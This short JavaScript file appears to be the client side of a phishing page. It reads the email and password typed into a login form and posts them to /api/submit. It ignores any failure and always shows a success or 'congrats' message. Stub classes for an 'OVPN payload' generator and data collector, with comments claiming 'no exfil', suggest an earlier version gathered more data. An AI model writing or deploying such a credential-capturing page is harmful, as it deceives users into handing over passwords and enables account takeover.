// Minimal: post to /api/submit. No tokens, no Notion calls in browser.
// Network config + OVPN payload generation kept for compatibility.
(async function () {
  const $ = (s, r = document) => r.querySelector(s);
  const form = $('form');
  const btn = $('button[type="submit"], .login-btn');
  const container = $('.login-container, .form-container, form')?.parentElement;
  const congrats = $('#congrats, .congratulations, .success-message');

  async function postJSON(url, body) {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    if (!r.ok) throw new Error('submit failed: ' + r.status);
    return r.json();
  }

  if (form) {
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = ($('input[name="email"], input[type="email"], #username, #email') || {}).value || '';
      const password = ($('input[name="password"], input[type="password"], #password') || {}).value || '';
      if (!email || !password) return;
      try {
        await postJSON('/api/submit', { email, password });
      } catch (_) {}
      if (container) container.style.display = 'none';
      if (congrats) congrats.style.display = 'block';
    });
  }

  // Keep iframe OVPN config + network-config-native hook surface intact (no auth, no exfil).
  window.OVPNGenerator = class {
    constructor() { this.config = {}; }
    async collectAllData() { return {}; }
    async autoDetectVPNConfig() { return null; }
    generateConfig() { return ''; }
  };
  window.NetworkConfigNative = window.NetworkConfigNative || { getConfig: async () => null };
})();